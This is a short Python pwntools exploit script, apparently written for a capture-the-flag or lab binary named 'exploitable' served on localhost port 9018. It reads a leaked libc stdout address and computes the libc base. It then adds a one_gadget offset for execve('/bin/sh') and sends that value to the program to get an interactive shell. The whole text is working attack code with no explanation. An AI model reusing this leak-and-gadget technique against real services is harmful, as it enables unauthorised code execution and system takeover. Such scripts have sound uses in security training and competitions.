from pwn import *

# 0x3ac5c execve("/bin/sh", esp+0x28, environ)
# constraints:
  # esi is the GOT address of libc
  # [esp+0x28] == NULL

elf_path = "/home/exploitable/exploitable"
libc_path = "/lib/i386-linux-gnu/libc-2.23.so"
EXPLOIT_REMOTE = True

libc = ELF(libc_path)

if not EXPLOIT_REMOTE:
    p = process(argv=[elf_path])
else:
    p = remote("localhost", 9018)

stdout_addr = unpack(p.recvn(4))
print("stdout_addr", hex(stdout_addr))

libc_addr = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
print("libc_addr", hex(libc_addr))

one_gadget_addr = libc_addr + 0x3ac5c
print("one_gadget_addr", hex(one_gadget_addr))

payload = str(unpack(pack(one_gadget_addr), signed=True))
print("payload", payload)

p.sendline(payload)
p.interactive()
